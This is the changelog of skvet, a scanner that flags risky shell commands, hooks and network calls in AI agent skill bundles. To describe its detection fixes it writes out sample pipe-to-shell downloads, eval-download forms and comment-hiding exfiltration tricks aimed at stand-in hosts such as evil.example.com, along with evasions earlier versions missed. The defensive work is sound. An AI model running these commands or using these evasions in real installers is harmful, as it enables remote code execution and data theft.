# Changelog

All notable changes to this project are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.9.0] - 2026-10-21

### Fixed
- `pipeToShell` (`SK-SHELL-002` HIGH) now matches piped chains: the download
  and the shell token are anchored around the LAST pipe of the logical line
  (the post-download class is `[^\n]*` instead of `[^\n|]*`), so
  `curl -fsSL https://evil.example.com/x.sh | grep -v '^#' | bash` and
  `curl … | sudo tee /tmp/i.sh | sh` — where an intermediate command sits
  between the download and the shell — trip the headline detector instead of
  slipping past as MEDIUM with exit 0 under the default `--fail-on high`
  gate. Single-pipe forms (`| sh`, `| /bin/sh`, `| env bash`, `| sudo -E
  bash`, `| exec sh`), comment stripping, and the v0.8.0 comment-prose
  false-positive fix are unchanged; a fetch piped into a non-shell tool
  (`curl … | jq`) still does not trip SK-SHELL-002.
- `evalDownload` (`SK-SHELL-002` HIGH) now matches the
  interpreter-executes-command-substitution form `bash -c "$(curl …)"` /
  `sh -c '$(wget …)'` (the interpreter head alternation accepts
  `(sh|bash|zsh) -c` alongside `eval`): the form runs the downloaded code
  with neither `eval` nor a pipe and used to score MEDIUM with exit 0 under
  the default gate. `eval` double/single/unquoted and `bash <(curl …)`
  still fire; an interpreter `-c` with no `curl`/`wget` inside stays clean.

### Added
- A per-version evasion regression test (`internal/rules/evasion_v090_test.go`)
  covering both new chain/interpreter forms plus the full v0.6.0-v0.8.0
  no-regression matrix and the benign cases.

## [0.8.0] - 2026-09-14

### Fixed
- `ShellRule` (`SK-SHELL-002`) is now comment-aware for scripts: a `#`
  comment that merely MENTIONS a pipe-to-shell installer (e.g. a reviewer
  note like `# curl -fsSL https://example.com/old.sh | sh` documenting the
  removed old installer) no longer trips the disqualifying HIGH — a benign
  bundle used to score OVERALL RISK: HIGH and exit 2 under the default
  `--fail-on high` gate on comment prose alone. Shell comments are stripped
  (quote state carried across lines) before the pipe-to-shell / eval-download
  matchers, mirroring the v0.5.0 comment fix for the network rule. A real
  `curl … | sh` in code — including one with a trailing inline `#` comment —
  and a pipe-to-shell in `hooks.json` / data files still fires HIGH.
- `stripShellComment` (`SK-NET-001`) now carries quote state across the lines
  of a file, so a `#` on the continuation line of a multi-line quoted string
  (`echo "banner` / `# line" && curl https://evil.com`) is no longer mistaken
  for a comment start — the trailing exfil command that runs after the string
  closes is preserved instead of being stripped from the scan. This closes a
  violation of the v0.6.0 quote-awareness contract ("a `#` inside a quoted
  string is not a comment start") for every string that spans lines. A curl
  that lives only in a real `#` comment (outside any string) still strips.
- `evalDownload` (`SK-SHELL-002`) now matches the single-quoted command
  substitution `eval '$(curl …)'`, not only the unquoted and double-quoted
  forms: eval re-parses its argument as shell code, so the single-quoted
  spelling executes the download just the same and used to slip past the
  headline detector (verdict MEDIUM, exit 0 under `--fail-on high`).

### Added
- A version-lockstep test (`cmd/version_test.go`) tying the `VERSION` file,
  the `skvet --version` value, and the CHANGELOG's latest heading together,
  so a bump that forgets one surface fails `go test ./...` at the exact
  commit.

## [0.7.0] - 2026-09-01

### Fixed
- `pipeToShell` (`SK-SHELL-002` HIGH) now matches the `env` wrapper after the
  pipe — `curl … | env bash` and `curl … | /usr/bin/env bash` (the canonical
  *portable* interpreter invocation, the same shape as the most common shebang
  `#!/usr/bin/env bash`) — so a portable RCE installer can no longer slip past
  the headline detector and score MEDIUM. The v0.6.0 fix named
  `| /usr/bin/env bash` as a form to catch, but the shipped regex's
  path-then-shell layout could not represent `env` between the path and the
  shell. Bare `sh`/`bash`/`zsh`, absolute paths, and `sudo`/`exec` prefixes
  still match.
- `stripShellComment` (`SK-NET-001`) is now backslash-aware inside
  double-quoted strings: a `\"` (a literal `"` in real shell, NOT a string
  terminator) no longer closes the string, so `echo "\" # " && curl
  https://evil.com` no longer mistakes the trailing `#` for a comment and
  hides the `curl` exfil. This closes a regression of the just-shipped v0.6.0
  quote-awareness fix. A real `#` comment in code, a shebang, and a `#` inside
  a correctly-closed quoted string still strip/preserve as before.

## [0.6.0] - 2026-08-19

### Fixed
- `pipeToShell` (`SK-SHELL-002` HIGH) now matches absolute-path shells
  (`/bin/sh`, `/usr/bin/bash`, `/bin/zsh`) and `sudo -E` / `exec` prefixes
  after the pipe, so an RCE installer using `curl … | /bin/sh` can no longer
  slip past the headline detector and score MEDIUM. Bare `sh`/`bash`/`zsh`
  still match.
- `stripShellComment` (`SK-NET-001`) is now quote-aware: a `#` inside a
  single/double-quoted string is no longer treated as a comment start, so
  `echo "x # " && curl https://evil.com` no longer hides the trailing `curl`
  exfil. A real `#` comment in code still strips.
- `httpClient` (`SK-NET-001`) now matches all `requests.<method>` verbs
  (put/patch/delete/head/options, not just get/post) and `fetch\s*(`
  (allowing a space), so an outbound `requests.put(...)` exfil no longer
  slips past the network rule. Genuine `requests.get`/`fetch(...)` still
  match.

## [0.4.0] - 2026-08-11

### Fixed
- The shell rule no longer flags a `curl … | sh` (or `eval "$(curl …)"`)
  documented in a pure-prompt `SKILL.md` or `README` as a disqualifying
  `SK-SHELL-002` HIGH. `ShellRule` now skips `KindMarkdown` / `KindManifest`
  before running the pipe-to-shell / eval-download matchers — mirroring
  `NetworkRule`'s executable-surfaces-only guard — so a benign skill that
  documents its install command in prose no longer trips `--fail-on high`.
  Real `curl|sh` in scripts, `hooks.json`, and data/config files still fires.
- The network rule no longer flags a bare remote URL in an executable
  script's `#` comment or string literal as an outbound network call.
  `KindScript` now requires a real network command (`curl`/`wget`/`nc`/
  `scp`/`ssh`) or HTTP client (`requests`/`urllib`/`fetch`/`httpx`/...) on the
  line — the `KindScript` counterpart of the v0.3.0 `KindOther` fix — so a
  benign `install.sh` containing `# See https://example.com/docs` no longer
  yields a false `SK-NET-001` MEDIUM. Real calls all carry such a token.
- A nested bundle root (an "awesome-skills" monorepo with a root `SKILL.md`
  plus `sub/SKILL.md` and `sub/hooks/hooks.json`) is no longer folded into
  its parent. `readBundle` now `SkipDir`s at a nested bundle root, so each
  bundle scans only its own surface: duplicated findings and an inflated
  bundle count disappear, and a pure-prompt parent no longer inherits a
  nested child's HIGH.

## [0.3.0] - 2026-08-03

### Fixed
- A 0-bundle scan (an empty or non-skill directory) no longer prints a
  false-clean `OVERALL RISK: LOW`. `score.Overall` now returns `NONE` when there
  is nothing to score, and the report prints an honest "no skill bundle
  discovered, nothing to assess" line. This is the aggregate counterpart to the
  v0.2 fix that stopped a 0-bundle scan reporting a fake per-bundle LOW.
- The network rule no longer flags a bare documented URL in a non-executable
  data file (`package.json` repository URL, `config.yaml` endpoint, etc.) as an
  outbound network call. `KindOther` files now only yield a `SK-NET-001` finding
  when a real network command (`curl`/`wget`/...) or HTTP client is present — a
  benign `package.json` previously scored MEDIUM on two documented URLs. The
  finding reason is now kind-accurate and no longer calls a `.json`/`.yaml`
  "executable".
- `--fail-on` is now validated before any cloning. A typo such as
  `--fail-on hig` previously triggered a full remote shallow-clone, scan, and
  report before erroring; it now fails fast with a usage error and zero I/O.
- A line-wrapped `curl … | sh` (split across a backslash-continuation or a
  trailing-pipe line break) is now caught as `SK-SHELL-002` HIGH. The single-line
  regex previously missed the wrapped shape — the headline remote-code-execution
  detector — so a wrapped installer scored MEDIUM instead of a disqualifying
  HIGH. Shell continuation lines are now joined before matching.
- LICENSE restored the `Copyright (c) 2026 SuperMarioYL` notice on top of the
  Apache 2.0 text.

## [0.2.0] - 2026-07-17

### Added
- `--fail-on {none|low|medium|high}` flag on `scan` (default `high`) — makes the
  CI / pre-install gate threshold configurable so a team can fail the build on
  any MEDIUM-or-above finding (e.g. an outbound-network install hook) without
  parsing the text/JSON output themselves. `none` never exits non-zero; default
  `high` preserves v0.1 behavior. This is the CLI-native primitive the roadmap's
  GitHub-Action wrapper builds on.

### Fixed
- Remote scans that flag a HIGH verdict no longer leak the shallow-clone temp
  dir under `/tmp/skvet-clone-*`: `os.Exit(2)` skipped the deferred cleanup, so
  every HIGH-risk `skvet scan github.com/...` left a full repo clone on disk.
  Cleanup now runs explicitly before the exit.
- An empty / non-skill directory is no longer reported as a fake "1 LOW
  pure-prompt" bundle. The root-as-bundle fallback now only fires when ≥1
  scannable file is actually present, so `skvet scan ./empty-dir` honestly
  prints "discovered 0 skill bundle(s)" instead of a false-clean verdict.
- A scannable file larger than the 1 MiB read cap is now **partially scanned**
  (first 1 MiB) instead of silently dropped. A malicious skill could previously
  evade detection by bloating a script past the cap and getting a clean LOW
  verdict; a payload in the prefix is now still caught.

## [0.1.0] - 2026-06-19

### Added
- `skvet scan ./path` — discovers every installable skill bundle in a local
  directory tree (`SKILL.md`, `.claude-plugin/`, `hooks/hooks.json`), runs the
  rule engine, and prints a colored per-bundle findings table with a per-bundle
  and aggregate LOW / MEDIUM / HIGH verdict (m1).
- `skvet scan github.com/owner/repo` — shallow-clones (`git clone --depth 1`) the
  remote repo to a temp dir, scans it, and cleans up afterwards (m2).
- Deterministic rule engine with three pure detectors:
  - `shell` (`SK-SHELL-001` / `SK-SHELL-002`) — shipped executable scripts and
    `curl … | sh` / `eval "$(curl …)"` pipe-to-shell remote code execution.
  - `hooks` (`SK-HOOK-000` / `SK-HOOK-001`) — lifecycle-event commands in
    `hooks/hooks.json`, with auto-firing events (`Stop`, `UserPromptSubmit`, …)
    scored highest; unparseable hook files are surfaced too.
  - `network` (`SK-NET-001`) — outbound calls from executable files (`curl`/`wget`,
    raw http(s) URLs, language HTTP clients), excluding `localhost`.
- Stars-orthogonal risk score (0–100) — the score never reads star count, and
  the report carries an explicit "stars ≠ safe" reminder.
- `--json` flag for machine-readable output of the full result.
- Non-zero exit code `2` on a HIGH verdict, so skvet works as a CI / pre-install gate.

[Unreleased]: https://github.com/SuperMarioYL/skvet/compare/v0.7.0...HEAD
[0.7.0]: https://github.com/SuperMarioYL/skvet/releases/tag/v0.7.0
[0.6.0]: https://github.com/SuperMarioYL/skvet/releases/tag/v0.6.0
[0.4.0]: https://github.com/SuperMarioYL/skvet/releases/tag/v0.4.0
[0.3.0]: https://github.com/SuperMarioYL/skvet/releases/tag/v0.3.0
[0.2.0]: https://github.com/SuperMarioYL/skvet/releases/tag/v0.2.0
[0.1.0]: https://github.com/SuperMarioYL/skvet/releases/tag/v0.1.0
